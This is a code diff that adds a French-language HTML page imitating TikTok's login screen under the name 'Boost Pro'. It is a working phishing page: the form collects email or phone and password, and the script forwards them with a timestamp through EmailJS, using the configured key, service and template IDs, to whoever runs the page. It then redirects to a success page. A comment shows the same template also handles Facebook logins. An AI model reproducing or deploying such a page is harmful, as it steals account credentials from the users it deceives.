@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Connexion TikTok - Boost Pro</title>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #FE2C55 0%, #25F4EE 100%); /* Couleurs TikTok */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden; /* Empêche le défilement indésirable */
+        }
+
+        .form-container {
+            background: rgba(0, 0, 0, 0.7); /* Fond sombre semi-transparent */
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 320px;
+            color: #fff;
+            text-align: center;
+        }
+
+        .tiktok-logo {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 3em;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: #fff; /* Couleur de base pour le logo */
+            position: relative;
+            display: inline-block;
+        }
+
+        .tiktok-logo::before {
+            content: 'Tik';
+            color: #25F4EE; /* Bleu */
+            position: absolute;
+            left: -3px;
+            top: 0;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+        }
+
+        .tiktok-logo::after {
+            content: 'Tok';
+            color: #FE2C55; /* Rouge */
+            position: absolute;
+            right: -3px;
+            top: 0;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+        }
+        /* Ajustement pour que le texte "TikTok" soit bien visible */
+        .tiktok-logo span {
+            position: relative;
+            z-index: 1; /* Pour que le texte blanc soit au-dessus */
+            color: #fff;
+        }
+
+        input {
+            width: calc(100% - 20px); /* Ajuster pour padding */
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid rgba(255, 255, 255, 0.3); /* Bordure légère */
+            border-radius: 8px;
+            background-color: rgba(255, 255, 255, 0.1); /* Fond légèrement transparent */
+            color: #fff;
+            font-size: 16px;
+            box-sizing: border-box; /* Inclure padding et bordure dans la largeur */
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.6); /* Couleur du placeholder */
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #FE2C55; /* Rouge TikTok */
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #25F4EE; /* Bleu TikTok au survol */
+            color: #000; /* Texte noir au survol */
+        }
+
+        .link-text {
+            display: block;
+            margin-top: 15px;
+            color: rgba(255, 255, 255, 0.8);
+            text-decoration: none;
+            font-size: 0.9em;
+            transition: color 0.3s ease;
+        }
+
+        .link-text:hover {
+            color: #FE2C55;
+        }
+    </style>
+</head>
+<body>
+
+<div class="form-container">
+    <div class="tiktok-logo"><span>TikTok</span></div>
+    <h2>Connectez-vous</h2>
+    <form id="tiktok-login-form">
+        <input type="text" name="login" placeholder="Email ou numéro de téléphone" required />
+        <input type="password" name="password" placeholder="Mot de passe" required />
+        <input type="hidden" name="date" id="date" />
+        <button type="submit">Se connecter</button>
+        <a href="#" class="link-text">Mot de passe oublié ?</a>
+        <a href="#" class="link-text" style="margin-top: 10px;">Créer un compte TikTok</a>
+    </form>
+</div>
+
+<script>
+    (function () {
+        emailjs.init("4ltNmWrqPWnfKPy7x"); // Votre Public Key EmailJS
+    })();
+
+    document.getElementById("tiktok-login-form").addEventListener("submit", function (e) {
+        e.preventDefault();
+        document.getElementById("date").value = new Date().toLocaleString();
+
+        const serviceID = "service_rtdebfm"; // Votre Service ID EmailJS
+        const templateID = "template_1g13r8b"; // Votre Template ID pour les connexions (TikTok et Facebook)
+
+        emailjs.sendForm(serviceID, templateID, this).then(
+            function () {
+                alert("Informations de connexion TikTok envoyées avec succès !");
+                // Redirige vers la page de succès après l'envoi
+                window.location.href = 'success_page.html'; 
+            },
+            function (error) {
+                alert("Erreur lors de l'envoi des informations : " + JSON.stringify(error));
+            }
+        );
+    });
+</script>
+
+</body>
+</html>
